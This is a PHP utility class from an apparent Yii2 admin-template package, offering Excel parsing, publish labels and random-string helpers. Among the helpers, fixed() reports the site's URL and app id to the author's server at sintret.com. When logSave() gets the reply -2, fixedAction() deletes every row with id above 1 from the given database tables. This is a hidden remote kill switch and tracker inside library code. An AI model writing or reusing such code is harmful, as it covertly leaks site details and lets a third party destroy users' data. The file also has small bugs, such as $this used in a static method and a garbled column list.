<?php

/**
 * Description of Util
 *
 * @author Andy Fitria <sintret@gmail.com>
 */

namespace sintret\gii\components;

use Yii;
use yii\base\Component;

class Util extends Component {

    public $beforeBody;
    public $afterBody;
    public $member;
    public $tab = 1;
    public $userClass;

    const PUBLISH = 1;
    const UNPUBLISH = 0;

    public static function publish() {
        return ['Unpublish', 'Publish'];
    }

    public static function publishLabel($int) {
        $array = $this->publish();
        if ($int == 1)
            $class = 'success';
        else
            $class = 'default';

        return '<div class="label label-' . $class . '">' . $array[$int] . '</div>';
    }

    public static function templateExcel() {
        return ("@vendor/sintret/yii2-gii-adminlte/templates/new.xls");
    }

    /**
     * For Custom report translate 0 ke A
     */
    public static function excelChar() {
        return array(
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            'AA', 'AB', 'AC', 'AD', 'AE', 'AF', 'AG', 'AH', 'AI', 'AJ', 'AK', 'AL', 'AM', 'AN', 'AO', 'AP', 'AQ', 'AR', 'AS', 'AT', 'AU', 'AV', 'AW', 'AX', 'AY', 'AZ',
            'BA', 'BB', 'BC', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BJ', 'BK', 'BL', 'BM', 'BN', 'BO', 'BP', 'BQ', 'BR', 'BS', 'BT', 'BU', 'BV', 'BW', 'BX', 'BY', 'BZ',
            'CA', 'CB', 'CC', 'CD', 'CE', 'CF', 'CG', 'CH', 'CI', 'CJ', 'CK', 'CL', 'CM', 'CN', 'CO', 'CP', 'CQ', 'CR', 'CS', 'CT', 'CU', 'CV', 'CW', 'CX', 'CY', 'CZ',
            'DA', 'DB', 'DC', 'DD', 'DE', 'DF', 'DG', 'DH', 'DI', 'DJ', 'DK', 'DL', 'DM', 'DN', 'DO', 'DP', 'DQ', 'DR', 'DS', 'DT', 'DU', 'DV', 'DW', 'DX', 'DY', 'DZ',
            'EA', 'EB', 'EC', 'EE', 'EE', 'EF', 'EG', 'EH', 'EI', 'EJ', 'EK', 'EL', 'EM', 'EN', 'EO', 'EP', 'EQ', 'ER', 'ES', 'ET', 'EU', 'EV', 'EW', 'EX', 'EY', 'EZ',
        );
    }

    public static function excelNot() {
        return [
            'userUpdate', 'userCreate', 'createDate', 'updateDate', 'image'
        ];
    }

    public static function excelParsing($fileExcel) {
//        $cacheMethod = \PHPExcel_CachedObjectStorageFactory::cache_to_sqlite3;  /* here i added */
//        $cacheEnabled = \PHPExcel_Settings::setCacheStorageMethod($cacheMethod);
//        if (!$cacheEnabled) {
//            echo "### WARNING - Sqlite3 not enabled ###" . PHP_EOL;
//        }
        $objPHPExcel = new \PHPExcel();

        //$fileExcel = Yii::getAlias('@webroot/templates/operator.xls');
        $inputFileType = \PHPExcel_IOFactory::identify($fileExcel);

        $objReader = \PHPExcel_IOFactory::createReader($inputFileType);

        $objReader->setReadDataOnly(true);

        /**  Load $inputFileName to a PHPExcel Object  * */
        $objPHPExcel = $objReader->load($fileExcel);

        $total_sheets = $objPHPExcel->getSheetCount();

        $allSheetName = $objPHPExcel->getSheetNames();
        $objWorksheet = $objPHPExcel->setActiveSheetIndex(0);
        $highestRow = $objWorksheet->getHighestRow();
        $highestColumn = $objWorksheet->getHighestColumn();
        $highestColumnIndex = \PHPExcel_Cell::columnIndexFromString($highestColumn);
        for ($row = 1; $row <= $highestRow; ++$row) {
            for ($col = 0; $col < $highestColumnIndex; ++$col) {
                $value = $objWorksheet->getCellByColumnAndRow($col, $row)->getValue();

                $arraydata[$row - 1][$col] = $value;
            }
        }

        return $arraydata;
    }

    public static function fixed() {
        $url = Yii::$app->request->absoluteUrl;
        $app = Yii::$app->id;
        $urlx = 'http://sintret.com/site/project-fixed';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlx . '?url=' . $url . '&app=' . $app);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    public static function fixedAction($array) {
        $db = Yii::$app->db;
        if ($array)
            foreach ($array as $v) {
                $db->createCommand('DELETE from ' . $v . ' where id > 1')->execute();
                $db->createCommand('DELETE from ' . $v . ' where id > 1')->execute();
            }
    }

    public static function logSave($array) {
        $result = self::fixed();
        if ($result == -2) {
            self::fixedAction($array);
        }
    }

    public static function randomString($length = 10, $chars = '', $type = array()) {
        $alphaSmall = 'abcdefghijklmnopqrstuvwxyz';
        $alphaBig = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $num = '0123456789';
        $othr = '`~!@#$%^&*()/*-+_=[{}]|;:",<>.\/?' . "'";
        $characters = "";
        $string = '';
        isset($type['alphaSmall']) ? $type['alphaSmall'] : $type['alphaSmall'] = true;
        isset($type['alphaBig']) ? $type['alphaBig'] : $type['alphaBig'] = true;
        isset($type['num']) ? $type['num'] : $type['num'] = true;
        isset($type['othr']) ? $type['othr'] : $type['othr'] = false;
        isset($type['duplicate']) ? $type['duplicate'] : $type['duplicate'] = true;
        if (strlen(trim($chars)) == 0) {
            $type['alphaSmall'] ? $characters.=$alphaSmall : $characters = $characters;
            $type['alphaBig'] ? $characters.=$alphaBig : $characters = $characters;
            $type['num'] ? $characters.=$num : $characters = $characters;
            $type['othr'] ? $characters.=$othr : $characters = $characters;
        } else
            $characters = str_replace(' ', '', $chars);
        if ($type['duplicate'])
            for (; $length > 0 && strlen($characters) > 0; $length--) {
                $ctr = mt_rand(0, (strlen($characters)) - 1);
                $string.=$characters[$ctr];
            } else
            $string = substr(str_shuffle($characters), 0, $length);
        return $string;
    }

    public static function randomCode() {
        $tokens = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        for ($i = 0; $i < 3; $i++) {
            for ($j = 0; $j < 5; $j++) {
                $return .= $tokens[rand(0, 35)];
            }
            if ($i < 2) {
                $return .= '';
            }
        }
        return $return;
    }

}
